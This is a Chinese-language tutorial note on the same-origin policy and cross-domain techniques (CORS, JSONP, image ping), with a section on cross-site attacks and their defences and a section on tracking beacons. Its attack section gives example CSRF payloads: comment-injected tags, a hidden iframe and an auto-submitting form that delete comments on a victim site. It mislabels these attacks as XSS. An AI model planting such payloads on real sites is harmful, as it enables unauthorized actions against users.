* 跨域访问
	凡是与主站地址的域名、端口、协议不一致的HTTP请求，都是跨域访问。
* 浏览器的同源策略
	同源策略分为两种：
		* DOM同源策略：禁止不同源页面的DOM操作。这里主要场景是iframe跨域，不同域名的iframe是限制互相访问的。
		* XMLHttpRequest同源策略：禁止使用XHR对象对不同源的服务地址发起HTTP请求。
* 跨域限制的必要性
	* 如果没有DOM同源策略，黑客可以通过如下操作进行攻击：
		1. 做一个假网站，里面iframe嵌套一个银行网站http://mybank.com
		2. 把iframe的宽高全部调整到占满页面全部，这样除了域名，别的部分和银行的网站没有任何区别。
		3. 当用户在这个页面输入账号密码，主站就可以进行跨域访问到http://mybank.com的dom节点，拿到用户的账号密码。
	* 如果没有XMLHttpRequest，那么黑客可以进行CSRF(跨站请求伪造)攻击：
		1. 用户登录了自己的银行页面http://mybank.com。http://mybank.com向用户的cookie中添加了用户标识
		2. 用户浏览了恶意页面http://evil.com，执行了页面中的恶意AJAX请求代码。
		3. http://evil.com向http://mybank.com发起了AJAX请求，请求会默认把http://mybank.com对应的cookie也同时发送过去。
		4. 银行页面从发送的cookie中提取用户标志，验证用户无误，response中返回请求数据。此时数据就泄露了。
		5. 由于AJAX在后台执行，用户无法感知这一过程。
	
* 如何进行跨域访问
	业务上有时需要跨域访问。通常有下面几种方法突破跨域限制
		* CORS
			CORS(Cross-origin resource sharing, 跨域资源共享)是一种W3C标准，定义了在必须访问跨域资源时，浏览器与服务器该如何进行沟通。
			CORS需要浏览器和服务器同时支持，目前除了IE9及更低版本无法支持，其他浏览器都支持。因此实现CORS通信的关键是服务器。
			浏览器将CORS请求分为简单请求和非简单请求，而服务器对这两种类型的CORS请求处理方法是不一样的。更详细的细节和过程不在这里讨论。
			CORS的优点：CORS通信和同源的AJAX通信没有差别，代码完全一样，容易维护，且支持所有类型的HTTP请求。
			CORS的缺点：兼容性相对稍差，IE10以下的浏览器不支持。另外在处理非简单请求时，会多一次HTTP请求（在浏览器进行非简单跨域时，在发送真正请求之前，会先向服务器发送一个Preflight请求）
		* JSONP
			script标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以动态创建script标签，然后利用src属性进行跨域。下面是一个简单的jsonp例子。
			**************************************************
			**************************************************
			// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据
			function handleResponse(data) {
				console.log(data);
			};

			// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse
			var body = document.getElementsByTagName('body')[0];
			var script = document.createElement('script');
			script.src = 'http://www.laixiangran.cn/json?callback=handleResponse';
			body.appendChild(script);

			// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?callback=handleResponse`，
			// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse({"name": "laixiangran"}) 给浏览器
			// 5. 浏览器在接收到 handleResponse({"name": "laixiangran"}) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。
			**************************************************
			**************************************************
			JSONP的优点：兼容性好
			JSONP的缺点：只支持GET请求，从其他域执行js代码，安全性可能受影响，另外难以确定JSONP请求是否请求失败。
		* 图像Ping跨域
			img标签不受同源策略影响，允许跨域引用资源。因此可以通过img标签的src属性进行跨域。下面是使用图像Ping实现跨域的例子：
			**************************************************
			**************************************************
			var img = new Image();

			// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本
			img.onload = img.onerror = function() {
				console.log("Done!");
			}

			// 请求数据通过查询字符串形式发送
			img.src = 'http://www.laixiangran.cn/test?name=laixiangran';
			**************************************************
			**************************************************
			图像Ping跨域的优点：用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。
			图像Ping跨域的缺点：只支持GET请求，且关键是它只能是浏览器与服务器的单向通信，因为浏览器无法访问服务器的响应文本。
		* form表单跨域
			form表单提交到其他域也是被允许的。因为form提交意味着跳转到新的站点，是一个有去无回的页面跳转，不存在对原站点的脚本操作。
		* 服务器代理
			浏览器有跨域限制，但是服务器不存在跨域问题。
		* document.domain跨域
		* window.name跨域
		* location.hash跨域
		* postMessage跨域
		
* 跨域攻击(XSS)
	跨域攻击可以理解为：诱导受害者访问非法网站，黑客利用受害者的会话信息模拟请求，以达到篡改数据的目的。
	跨域攻击必须要有页面入口。如何在目标网站(地址：http://ablog.com:8080)植入攻击者的代码？假设目标网站有评论功能，攻击者可以将自己的代码输入到评论区，如果目标网站没有XSS防御，则会将攻击者的代码以html的方式显示在网页上，这也就完成了第一点，提供了攻击入口。例如攻击者可以在评论区输入以下内容：
		<a href="http://ablog.com:8080/admin/comments/delete?coid=39" >java速成，点我免费领取</a>
	或者如下内容：
		<img src=''http://ablog.com:8080/admin/comments/delete?coid=39“></img>
	以上两个标签都会请求当前服务器进行删除操作。但是上面两个请求都是GET请求，如果服务器拒绝GET请求，只接受POST。是不是就没招了？毕竟标签里没法模拟post提交。但是攻击者可以模拟表单，代码如下：
		 <form action="http://ablog.com:8080/admin/comments/delete" method="post">
			<input type="hidden" name="coid" value="39" />
			<input type="submit" name="button" value="java速成，点我免费领取" />
		</form>
	或者一个更隐秘的跨域攻击：
		上述攻击方式还不算隐蔽，毕竟需要受害者点击触发按钮，还需要页面跳转，太low。我们可以使用一个影藏的iframe完成攻击，使得攻击操作神不知鬼不觉。在网站ablog.com评论区中植入如下代码：
		   <iframe style="display:none;" src="http://bblog.com:8083/csrf?coid=41"></iframe>
		   form模拟提交的部分依然放在bblog.com中，使用脚本自动执行。部分代码如下：     

		 <script>
		 function dianwoSub() {
			document.getElementById("dianwoForm").submit();
		}
		 </script>
		 <body onload="dianwoSub()">
			<div class="container">
				<form action="http://ablog.com:8080/admin/comments/delete" method="post" id="dianwoForm">
					<input type="hidden" name="coid" value="${coid}" />
					<input type="submit" name="button" value="点我" />
				</form>
			</div>
		 </body>

* 如何避免跨域攻击
	* 服务器对与用户的任何输入必须经过校验，对于出现非法字符一定要拦截。
	* 系统请求优先使用POST提交，GET请求会减低XSS门槛。
	* Refer来源判断，系统在接受请求时，判断来源请求是否可信任，如果时非法的需要拦截。
	* 增加验证码校验。在做增删改操作时，强行让用户再次与后台交互，这虽然影响用户体验，但是能很大程度避免攻击。
	* token校验。

* 网络信标
	网络信标又称网络臭虫，通过植入第三方代码来收集访问者信息。例如在ablog.com网站中植入如下代码：
		<img src="http://bblog.com:8083/netflag" height="1" width="1"></img>
	大小仅为一个像素，用户很难发现。凡是打开植入此代码的网页，都会访问bblog.com。
	 通过以上信息，我们可以给用户设置一个唯一标记，并写入到cookie中，例如bloguser=user_127.0.0.11540367865328。后端同时将此标记以及对应信息保存到数据库中，这样可以跟踪某一特定用户的访问路径。假设一个集团公司的业务范围非常广，其信息化系统包含多个二级域名，比如注册页面是login.blog.com,充值页面是deposit.xyz.com,购物页面是shopping.abc.com等，这些域名的cookie是无法共享的，这时候可以采取网络信标的方式，在所有主页上均植入上述代码，通过第三方cookie的方式，将访问者信息全部串联起来。        
     网络信标的另外一种使用场景是广告推荐。百度的广告联盟就是很好的例子。我们在百度上搜索一些关键字之后，访问其他网站时（例如CSDN）会发现，为何我刚刚搜索的关键字图片会在CSDN网页上显示？那CSDN很有可能放置了百度的脚本代码。用户在百度上进行搜索之后，百度将搜索关键字写入到用户的cookie信息中，CSDN内置了百度的广告代码，这个代码会访问百度服务器，同时会带上百度之前设置的cookie，百度后台根据关键字来响应相关图片或者文字链接，达到精准投放广告的效果。  
    